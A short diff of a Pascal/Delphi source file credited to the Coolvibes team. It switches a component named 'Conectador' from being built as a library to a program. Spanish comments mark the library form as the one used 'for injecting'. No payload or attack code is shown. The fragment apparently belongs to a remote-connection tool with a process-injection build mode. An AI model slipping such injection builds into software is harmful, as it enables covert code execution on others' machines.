@@ -11,8 +11,8 @@
 
      El equipo Coolvibes
 *)
-library Conectador; //Para inyectar descomentar
-//program Conectador; //Para no inyectar descomentar
+//library Conectador; //Para inyectar descomentar
+program Conectador; //Para no inyectar descomentar
 
 uses
   Windows,
